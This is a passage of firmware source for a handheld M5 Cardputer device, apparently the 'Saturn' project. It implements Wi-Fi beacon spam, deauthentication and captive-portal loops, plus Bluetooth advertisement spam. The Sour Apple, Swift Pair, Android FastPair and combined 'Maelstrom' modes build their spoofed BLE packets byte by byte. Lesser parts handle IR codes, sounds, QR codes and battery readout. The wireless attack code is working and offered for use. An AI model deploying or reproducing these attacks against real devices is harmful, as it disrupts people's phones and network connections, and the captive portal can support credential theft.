        target_deauth = !target_deauth;
        delay(500);
      }
    }
  }

  dnsServer.processNextRequest();
  webServer.handleClient();
  
  if (checkNextPress() || checkSelectPress() || checkESCPress()) {
    shutdownWebServer();
    portalActive = false;
    target_deauth_flg = false;
    target_deauth = false;
    clone_flg = false;
    currentProc = 20;
    delay(500);
  }
  checkSelectPress();
}

// -=-=-= BEACON =-=-=-

void wifiBeaconSetup() {
  // Create empty SSID
  for (int i = 0; i < 32; i++)
    emptySSID[i] = ' ';
  // For random generator
  randomSeed(1);

  // Set packetSize
  packetSize = sizeof(beaconPacket);
  if (wpa2) {
    beaconPacket[34] = 0x31;
  } else {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }

  //change WiFi mode
  WiFi.mode(WIFI_MODE_STA);

  // Set channel
  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);

  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(LARGE_TEXT);
  DISPLAY.drawString(TXT_BEACON_ATTACK_1, DISPLAY_CENTER_X, 50);
  DISPLAY.drawString(TXT_BEACON_ATTACK_2, DISPLAY_CENTER_X, 80);
  delay(1500);
  DISPLAY.setTextSize(SMALL_TEXT);
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setCursor(0, 0);
  DISPLAY.print(TXT_BEACON_ATTACK);

  int ct = 0;
  const char *str;
  switch(beaconType) {
  case 1:
    for(str = funnySSIDs; *str; ++str) ct += *str == '\n';
    DISPLAY.printf(" - %d SSIDs:\n", ct);
    DISPLAY.print(funnySSIDs);
    break;
  case 2:
    for(str = funnySSIDsBR; *str; ++str) ct += *str == '\n';
    DISPLAY.printf(" - %d SSIDs:\n", ct);
    DISPLAY.print(funnySSIDsBR);
    break;
  case 3:
    DISPLAY.printf(TXT_RND_SSID, ct);
    break;
  }
  DISPLAY.setTextSize(SMALL_TEXT);
  currentProc = 21;
}

void wifiBeaconLoop() {
  int i = 0;
  int len = 0;
  switch(beaconType) {
    case 1:
      len = sizeof(funnySSIDs);
      while(i < len){
        i++;
      }
      Serial.println("ATTACK -> Spamming funny SSIDs");
      beaconSpamList(funnySSIDs);
      break;
    case 2:
      len = sizeof(funnySSIDsBR);
      while(i < len){
        i++;
      }
      Serial.println("ATTACK -> Spamming funny SSIDs BR");
      beaconSpamList(funnySSIDsBR);
      break;
    case 3:
      char* randoms = randomSSID();
      len = sizeof(randoms);
      while(i < len){
        i++;
      }
      Serial.println("ATTACK -> Spamming random SSIDs");
      beaconSpamList(randoms);
      break;
  }
}

// -=-=-= BLUETOOTH =-=-=-

void bluetoothMenuSetup() {
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  androidPair = false;
  rstOverride = true;
  drawMenu(bluetoothMenu, bluetoothMenuSize);
  delay(500); // Prevent switching after menu loads up
}

void bluetoothMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % bluetoothMenuSize;
    drawMenu(bluetoothMenu, bluetoothMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    int option = bluetoothMenu[cursor].command;

    DISPLAY.fillScreen(BG_COLOR);
    DISPLAY.setTextSize(MEDIUM_TEXT);
    DISPLAY.setTextColor(BG_COLOR);
    DISPLAY.fillRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
    DISPLAY.drawRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
    DISPLAY.drawString("Bluetooth Spam", DISPLAY_CENTER_X, 20);
    DISPLAY.setTextSize(1.5);
    DISPLAY.setTextColor(MAIN_COLOR);
    DISPLAY.drawString(TXT_ADV, DISPLAY_CENTER_X, 70);

    switch(option) {
      case 1:  // AppleJuice
        DISPLAY.fillScreen(BG_COLOR);
        rstOverride = false;
        isSwitching = true;
        currentProc = 28;
        break;
      case 2:  // appleJuiceAdvertising
        swiftPair = true;
        currentProc = 29; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISPLAY.drawString(TXT_SP_RND, DISPLAY_CENTER_X, 85);
        DISPLAY.drawString(TXT_SEL_EXIT2, DISPLAY_CENTER_X, 100);
        break;
      case 4:  // appleJuiceAdvertising
        sourApple = true;
        currentProc = 29; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISPLAY.drawString(TXT_SA_CRASH, DISPLAY_CENTER_X, 85);
        DISPLAY.drawString(TXT_SEL_EXIT2, DISPLAY_CENTER_X, 100);
        break;
      case 5:  // BT Maelstrom
        rstOverride = false;
        isSwitching = true;
        currentProc = 30; // Maelstrom
        DISPLAY.drawString("Bluetooth Maelstrom", DISPLAY_CENTER_X, 85);
        DISPLAY.drawString(TXT_CMB_BT_SPAM, DISPLAY_CENTER_X, 100);
        DISPLAY.drawString(TXT_SEL_EXIT2, DISPLAY_CENTER_X, 115);
        break;
      case 3:  // Android Spam
        androidPair = true;
        currentProc = 29; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISPLAY.drawString(TXT_AD_SPAM, DISPLAY_CENTER_X, 85);
        DISPLAY.drawString(TXT_SEL_EXIT2, DISPLAY_CENTER_X, 100);
        break;
      case 0:  // Back
        DISPLAY.fillScreen(BG_COLOR);
        rstOverride = false;
        isSwitching = true;
        currentProc = 1;
        break;
    }
  }
}

void appleJuiceSetup(){
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextSize(3);
  DISPLAY.setTextColor(MAIN_COLOR);
  DISPLAY.drawString("AppleJuice", DISPLAY_CENTER_X, 70);
  DISPLAY.setTextColor(MAIN_COLOR);
  delay(1000);  
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  rstOverride = true;
  drawMenu(appleJuiceMenu, appleJuiceMenuSize);
}

void appleJuiceLoop(){
  if (!maelstrom){
    if (checkNextPress()) {
      cursor++;
      cursor = cursor % appleJuiceMenuSize;
      drawMenu(appleJuiceMenu, appleJuiceMenuSize);
      delay(100);
    }
  }
  if (checkSelectPress() || maelstrom) {
    deviceType = appleJuiceMenu[cursor].command;
    if (maelstrom) {
      deviceType = random(1, 28);
    }
    switch(deviceType) {
      case 1:
        data = Airpods;
        break;
      case 2:
        data = AirpodsPro;
        break;
      case 3:
        data = AirpodsMax;
        break;
      case 4:
        data = AirpodsGen2;
        break;
      case 5:
        data = AirpodsGen3;
        break;
      case 6:
        data = AirpodsProGen2;
        break;
      case 7:
        data = PowerBeats;
        break;
      case 8:
        data = PowerBeatsPro;
        break;
      case 9:
        data = BeatsSoloPro;
        break;
      case 10:
        data = BeatsStudioBuds;
        break;
      case 11:
        data = BeatsFlex;
        break;
      case 12:
        data = BeatsX;
        break;
      case 13:
        data = BeatsSolo3;
        break;
      case 14:
        data = BeatsStudio3;
        break;
      case 15:
        data = BeatsStudioPro;
        break;
      case 16:
        data = BeatsFitPro;
        break;
      case 17:
        data = BeatsStudioBudsPlus;
        break;
      case 18:
        data = AppleTVSetup;
        break;
      case 19:
        data = AppleTVPair;
        break;
      case 20:
        data = AppleTVNewUser;
        break;
      case 21:
        data = AppleTVAppleIDSetup;
        break;
      case 22:
        data = AppleTVWirelessAudioSync;
        break;
      case 23:
        data = AppleTVHomekitSetup;
        break;
      case 24:
        data = AppleTVKeyboard;
        break;
      case 25:
        data = AppleTVConnectingToNetwork;
        break;
      case 26:
        data = TVColorBalance;
        break;
      case 27:
        data = TransferNumber;
        break;
      case 28:
        data = SetupNewPhone;
        break;
      case 29:
        data = AppleVisionPro;
        break;
      case 0:
        rstOverride = false;
        isSwitching = true;
        currentProc = 27;  // Back to Bluetooth Menu
        break;
    }
    if (currentProc == 28 && isSwitching == false){
      DISPLAY.fillScreen(BG_COLOR);
      DISPLAY.setTextSize(MEDIUM_TEXT);
      DISPLAY.setTextColor(BG_COLOR);
      DISPLAY.fillRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
      DISPLAY.drawRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
      DISPLAY.drawString("AppleJuice", DISPLAY_CENTER_X, 20);
      DISPLAY.setTextSize(1.5);
      DISPLAY.setTextColor(MAIN_COLOR);
      DISPLAY.drawString(String(appleJuiceMenu[cursor].name), DISPLAY_CENTER_X, 70);
      DISPLAY.drawString(TXT_ADV, DISPLAY_CENTER_X, 85);
      DISPLAY.drawString(TXT_SEL_EXIT2, DISPLAY_CENTER_X, 100);
      isSwitching = true;
      currentProc = 29; // Jump over to the AppleJuice BLE beacon loop
    }
  }
}

void appleJuiceAdvertisingSetup(){
  rstOverride = false;  
}

void appleJuiceAdvertisingLoop(){
  // run the advertising loop
  // Isolating this to its own process lets us take advantage 
  // of the background stuff easier (menu button, dimmer, etc)
  rstOverride = true;
  if (sourApple || swiftPair || androidPair || maelstrom){
    delay(20);   // 20msec delay instead of ajDelay for SourApple attack
    advtime = 0; // bypass ajDelay counter
  }
  if (millis() > advtime + ajDelay){
    advtime = millis();
    pAdvertising->stop(); // This is placed here mostly for timing.
                          // It allows the BLE beacon to run through the loop.
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    if (sourApple){
      Serial.print(TXT_SA_ADV);
      // Some code borrowed from RapierXbox/ESP32-Sour-Apple
      // Original credits for algorithm ECTO-1A & WillyJL
      uint8_t packet[17];
      uint8_t size = 17;
      uint8_t i = 0;
      packet[i++] = size - 1;    // Packet Length
      packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
      packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
      packet[i++] = 0x00;        // ...
      packet[i++] = 0x0F;  // Type
      packet[i++] = 0x05;                        // Length
      packet[i++] = 0xC1;                        // Action Flags
      const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
      packet[i++] = types[rand() % sizeof(types)];  // Action Type
      esp_fill_random(&packet[i], 3); // Authentication Tag
      i += 3;
      packet[i++] = 0x00;  // ???
      packet[i++] = 0x00;  // ???
      packet[i++] =  0x10;  // Type ???
      esp_fill_random(&packet[i], 3);
      oAdvertisementData.addData(std::string((char *)packet, 17));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");
    } else if (swiftPair) {
      const char* display_name = generateRandomName();
      Serial.printf(TXT_SP_ADV, display_name);
      uint8_t display_name_len = strlen(display_name);
      uint8_t size = 7 + display_name_len;
      uint8_t* packet = (uint8_t*)malloc(size);
      uint8_t i = 0;
      packet[i++] = size - 1; // Size
      packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
      packet[i++] = 0x06; // Company ID (Microsoft)
      packet[i++] = 0x00; // ...
      packet[i++] = 0x03; // Microsoft Beacon ID
      packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
      packet[i++] = 0x80; // Reserved RSSI Byte
      for (int j = 0; j < display_name_len; j++) {
        packet[i + j] = display_name[j];
      }
      for (int i = 0; i < size; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");

      i += display_name_len;  
      oAdvertisementData.addData(std::string((char *)packet, size));
      free(packet);
      free((void*)display_name);
    } else if (androidPair) {
      Serial.print(TXT_AD_SPAM_ADV);
      uint8_t packet[14];
      uint8_t i = 0;
      packet[i++] = 3;  // Packet Length
      packet[i++] = 0x03; // AD Type (Service UUID List)
      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
      packet[i++] = 0xFE; // ...
      packet[i++] = 6; // Size
      packet[i++] = 0x16; // AD Type (Service Data)
      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
      packet[i++] = 0xFE; // ...
      const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
      packet[i++] = (model >> 0x10) & 0xFF;
      packet[i++] = (model >> 0x08) & 0xFF;
      packet[i++] = (model >> 0x00) & 0xFF;
      packet[i++] = 2; // Size
      packet[i++] = 0x0A; // AD Type (Tx Power Level)
      packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

      oAdvertisementData.addData(std::string((char *)packet, 14));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");
    } else {
      Serial.print(TXT_AJ_ADV);
      if (deviceType >= 18){
        oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
      } else {
        oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
      }
      for (int i = 0; i < sizeof(Airpods); i ++) {
        Serial.printf("%02x", data[i]);
      }      
      Serial.println("");
    }
    
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
#if defined(M5LED)
    digitalWrite(M5LED, M5LED_ON); //LED ON on Stick C Plus
    delay(10);
    digitalWrite(M5LED, M5LED_OFF); //LED OFF on Stick C Plus
#endif
  }
  if (checkNextPress()) {
    if (sourApple || swiftPair || androidPair || maelstrom){
      isSwitching = true;
      currentProc = 27;
      drawMenu(bluetoothMenu, bluetoothMenuSize);
    } else {
      isSwitching = true;
      currentProc = 28;      
      drawMenu(appleJuiceMenu, appleJuiceMenuSize);
    }
    sourApple = false;
    swiftPair = false;
    maelstrom = false;
    pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
    delay(250);
  }
}

void bluetoothMaelstromSetup(){
  rstOverride = false;
  maelstrom = true;
}

void bluetoothMaelstromLoop(){
  swiftPair = false;
  sourApple = true;
  appleJuiceAdvertisingLoop();
  if (maelstrom){
    swiftPair = true;
    androidPair = false;
    sourApple = false;
    appleJuiceAdvertisingLoop();
  }
  if (maelstrom){
    swiftPair = false;
    androidPair = true;
    sourApple = false;
    appleJuiceAdvertisingLoop();
  }
  if (maelstrom){
    swiftPair = false;
    androidPair = false;
    sourApple = false;
    appleJuiceLoop(); // roll a random device ID
    appleJuiceAdvertisingLoop();
  }
}

// -=-=-= SOUNDS =-=-=-

void soundMenuSetup() {
  cursor = 0;
  rstOverride = true;
  drawMenu(soundMenu, soundMenuSize);
  delay(500);
}

void soundMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % soundMenuSize;
    drawMenu(soundMenu, soundMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    int option = soundMenu[cursor].command;
    rstOverride = false;
    isSwitching = true;
    switch(option) {
      case 0:
        currentProc = 1;
        break;
      case 1:
        superMarioBrossSound();
        break;
      case 2:
        imperialMarchSound();
        break;
      case 3:
        ahaTakeOnMeSound();
        break;
      case 4:
        jingleBellsSound();
        break;
      case 5:
        ozzyOsbornCrazyTrainSound();
        break;
      case 6:
        starWarsSound();
        break;
      case 7:
        nokiaSound();
        break;
    }
  }
}

// -=-=-= QR CODES =-=-=-

void qrMenuSetup() {
  cursor = 0;
  rstOverride = true;
  qrDrawMenu(qrMenuSize);
  delay(500);
}

void qrMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % (qrMenuSize);
    qrDrawMenu(qrMenuSize);
    delay(250);
  }
  if (checkSelectPress()) {
    if (qrMenu[cursor].url.length() < 1){
      currentProc = 1;
      isSwitching = true;
    }else if ( activeQR == false ) {
      activeQR = true;
      DISPLAY.fillScreen(WHITE);
      DISPLAY.qrcode(qrMenu[cursor].url, (DISPLAY.width() - DISPLAY.height()) / 2, 0, DISPLAY.height(), 5);
      delay(500);
    } else {
      isSwitching = true;
      activeQR = false;
      delay(250);
    }
  }
}

bool screen_dim_dimmed = false;
int screen_dim_current = 0;
int screen_dim_time = 30;

void screenBrightness(int bright){
  #if defined(BACKLIGHT)
    int bl = MINBRIGHT + round(((255 - MINBRIGHT) * bright / 100)); 
    analogWrite(BACKLIGHT, bl);
  #endif
}

int uptime(){
  return(int(millis() / 1000));
}

void dimTimer(){
  if(screen_dim_dimmed){
    screenBrightness(brightness);
    screen_dim_dimmed = false;
  }
  screen_dim_current = uptime() + screen_dim_time + 2;
}

// -=-=-= IR FUNCTIONS =-=-=-

void sendIrRawCodes(uint16_t *codes[], int sizes[], String name) {
  int size_all_codes = sizeof(codes) / sizeof(uint16_t*);

  bool endingEarly = false;

  for (int i = 0; i < size_all_codes; i++) {
    int size = sizes[i];
    DISPLAY.fillScreen(BG_COLOR);
    DISPLAY.setTextSize(LARGE_TEXT);
    DISPLAY.drawString(name, DISPLAY_CENTER_X, 50);
    DISPLAY.setTextSize(MEDIUM_TEXT);
    DISPLAY.drawString("<- p/ voltar", DISPLAY_CENTER_X, 80);

    irsend.sendRaw(codes[i], size, 38);

    Serial.println("IR -> Sent raw code");
    delay(40);
  }
  digitalWrite(IR_SEND_PIN, HIGH);
  delay(1000);
  if (checkSelectPress()){
    Serial.println("STOPPING PREMATURELY");
    endingEarly = true;
    currentProc = 5;
  }
}

void sendIrProntoCodes(uint16_t *codes[], int sizes[], String name) {
  int size_all_codes = sizeof(codes) / sizeof(uint16_t*);

  bool endingEarly = false;

  for (int i = 0; i < size_all_codes; i++) {
    int size = sizes[i];
    DISPLAY.fillScreen(BG_COLOR);
    DISPLAY.setTextSize(LARGE_TEXT);
    DISPLAY.drawString(name, DISPLAY_CENTER_X, 50);
    DISPLAY.setTextSize(MEDIUM_TEXT);
    DISPLAY.drawString("<- p/ voltar", DISPLAY_CENTER_X, 80);

    irsend.sendPronto(codes[i], size);

    Serial.println("IR -> Sent Pronto code");

    delay(40);
  }
  digitalWrite(IR_SEND_PIN, HIGH);
  delay(1000);
  if (checkSelectPress()){
    Serial.println("STOPPING PREMATURELY");
    endingEarly = true;
    currentProc = 5;
  }
}

void settingsMenuSetup() {
  cursor = 0;
  rstOverride = true;
  drawMenu(settingsMenu, sizeof(settingsMenu) / sizeof(Menu));
  delay(500);
}

void settingsMenuLoop() {
  if (checkNextPress()) {
    cursor++;
    cursor = cursor % (sizeof(settingsMenu) / sizeof(Menu));
    drawMenu(settingsMenu, sizeof(settingsMenu) / sizeof(Menu));
    delay(250);
  }
  if (checkSelectPress()) {
    if (settingsMenu[cursor].command == 19) {
      isSwitching = true;
      currentProc = 19;
    } else if (settingsMenu[cursor].command == 0) {
      isSwitching = true;
      currentProc = 1;
    }
  }
}

// -=-=-= BATTERY INFO =-=-=-

uint8_t oldBattery = 0;

void batteryDrawMenu(uint8_t battery) {
  // Battery bar color based on percentage
  uint16_t batteryBarColor = MAIN_COLOR;
  if(battery < 20) {
    batteryBarColor = RED;
  } else if(battery < 60) {
    batteryBarColor = ORANGE;
  } else {
    batteryBarColor = MAIN_COLOR;
  }
  // Draw battery bar
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.drawRect(10, 10, 220, 100, batteryBarColor);
  DISPLAY.fillRect(10, 10, (220 * battery / 100), 100, batteryBarColor);

  // Battery percentage
  DISPLAY.setTextColor(BLACK);
  DISPLAY.setTextSize(LARGE_TEXT);
  DISPLAY.setCursor(90, 60, 1);
  DISPLAY.print(battery);
  DISPLAY.println("%");

  // Exit text
  DISPLAY.setCursor(10, 120, 1);
  DISPLAY.setTextColor(WHITE);
  DISPLAY.setTextSize(SMALL_TEXT);
  DISPLAY.println(TXT_EXIT);
  DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
}

int getBatteryVoltage() {
    return M5.Power.getBatteryLevel();
  }

void batterySetup() {
  rstOverride = false;
  pinMode(VBAT_PIN, INPUT);
  uint8_t battery = ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
  batteryDrawMenu(battery);
  delay(500); // Prevent switching after menu loads up
  /*
    Used minimum 3,0V and maximum 4,2V for battery. So it may show wrong values. Needs testing.
    It only shows decent values when disconnected from charger, due to HW limitations.
    Equation: Bat% = ((Vadc - 1842) / (2580 - 1842)) * 100. Where: 4,2V = 2580, 3,0V = 1842.
  */
}

void batteryLoop() {
  // Read 30 battery values to calculate the average (avoiding unprecise and close values)
  uint16_t batteryValues = 0;
  for(uint8_t i = 0; i < 30; i++) { // 30 iterations X 100ms = 3 seconds for each refresh
    delay(100);
    batteryValues += ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
    M5Cardputer.update();
    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) { // If any key is pressed
      rstOverride = false;
      isSwitching = true;
      currentProc = 1;
      break;
    }
  }

  if(!isSwitching) { // If is not switching, calculate battery average
    uint8_t battery = batteryValues / 30; // Iteration times
    Serial.printf("Battery Level: %d\n", battery);
    if(battery != oldBattery) { // Only draw a new screen if value is different
      oldBattery = battery;
      batteryDrawMenu(battery);
    }
  }
}

// -=-=-= SETUP AND LOOP =-=-=-

void setup() {
  auto cfg = M5.config();
  M5Cardputer.begin(cfg);
  M5Cardputer.Display.setRotation(1);
  DISPLAY.setTextDatum(middle_center);

  #if defined(IR_SEND_PIN)
    pinMode(IR_SEND_PIN, OUTPUT);
    digitalWrite(IR_SEND_PIN, HIGH);
  #endif
  
  // Boot screen
  DISPLAY.fillScreen(BG_COLOR);
  DISPLAY.setTextColor(MAIN_COLOR);
  DISPLAY.setTextSize(LARGE_TEXT);
  DISPLAY.drawString("Saturn", DISPLAY_CENTER_X, 40);
  DISPLAY.setTextSize(MEDIUM_TEXT);
  DISPLAY.drawString("Cardputer", DISPLAY_CENTER_X, 70);
  DISPLAY.setTextSize(SMALL_TEXT);
  DISPLAY.drawString("@henriquesebastiao", DISPLAY_CENTER_X, 90);
  DISPLAY.drawString(SATURN_VERSION, DISPLAY_CENTER_X, 105);

  Serial.println("\nSaturn " + String(SATURN_VERSION) + " <-> STARTED");
  Serial.println("Develped by: @henriquesebastiao");
  Serial.println("Source Code: https://github.com/henriquesebastiao/saturn");
  Serial.println("-----------------------------");

  #if defined(LANGUAGE_EN_US)
    Serial.println("Language: English (US)");
  #else
    Serial.println("Language: Portuguese (BR)");
  #endif

  #if defined(SOUND)
    Serial.println("Silent Mode: NO\n");

    // Beep on boot, similar to Mikrotik boot sound
    delay(500);
    M5Cardputer.Speaker.tone(5050, 90);
    delay(220);
    M5Cardputer.Speaker.tone(5050, 90);
    delay(500);
  #else
    Serial.println("Silent Mode: YES");
    delay(1400);
  #endif

  getSSID();  // ???

  // Random seed
  randomSeed(analogRead(0));

  // Create the BLE Server
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Captive Portal Init
  setupSdCard();
  bootTime = lastActivity = millis();
}

// Proccesses
// 1 - Main Menu
// 2 - QR Codes
// 3 - Settings
// 4 - IR Devices
// 5 - IR TV
// 19 - Battery Status
// 20 - Wi-Fi Menu
// 21 - Wi-Fi Beacon
// 22 - Wi-Fi Scan
// 23 - Wi-Fi Attack Menu
// 24 - Wi-Fi Scan Result
// 25 - Captive Portal
// 26 - Deauth
// 27 - Bluetooth
// 28 - AppleJuice
// 29 - AppleJuice Advertising
// 30 - Bluetooth Maelstrom

void loop() {
  // Background processes
  switcherButtonProc();
  checkMenuPress();

  if (isSwitching) {
    isSwitching = false;
    Serial.println("Switching to process: " + String(currentProc));
    switch (currentProc) {
      case 1:
        mainMenuSetup();
        break;
      case 2:
        qrMenuSetup();
        break;
      case 3:
        settingsMenuSetup();
        break;
      case 4:
        irDevicesMenuSetup();
        break;
      case 5:
        irTvMenuSetup();
        break;
      case 19:
        batterySetup();
        break;
      case 20:
        wifiMenuSetup();
        break;
      case 21:
        wifiBeaconSetup();
        break;
      case 22:
        wifiScanSetup();
        break;
      case 23:
        wifiAttackMenuSetup();
        break;
      case 24:
        wifiScanResultSetup();
        break;
      case 25:
        portalSetup();
        break;
      case 26:
        deauthSetup();
        break;
      case 27:
        bluetoothMenuSetup();
        break;
      case 28:
        appleJuiceSetup();
        break;
      case 29:
        appleJuiceAdvertisingSetup();
        break;
      case 30:
        bluetoothMaelstromSetup();
        break;
      case 31:
        soundMenuSetup();
        break;
      case 32:
        wifiSignalLevelSetup();
        break;
    }
  }

  switch (currentProc) {
    case 1:
      mainMenuLoop();
      break;
    case 2:
      qrMenuLoop();
      break;
    case 3:
      settingsMenuLoop();
      break;
    case 4:
      irDevicesMenuLoop();
      break;
    case 5:
      irTvMenuLoop();
      break;
    case 19:
      batteryLoop();
      break;
    case 20:
      wifiMenuLoop();
      break;
    case 21:
      wifiBeaconLoop();
      break;
    case 22:
      wifiScanLoop();
      break;
    case 23:
      wifiAttackMenuLoop();
      break;
    case 24:
      wifiScanResultLoop();
      break;
    case 25:
      portalLoop();
      break;
    case 26:
      deauthLoop();
      break;
    case 27:
      bluetoothMenuLoop();
      break;
    case 28:
      appleJuiceLoop();
      break;
    case 29:
      appleJuiceAdvertisingLoop();
      break;
    case 30:
      bluetoothMaelstromLoop();
      break;
    case 31:
      soundMenuLoop();
      break;
    case 32:
      wifiSignalLevelLoop();
      break;
  }
}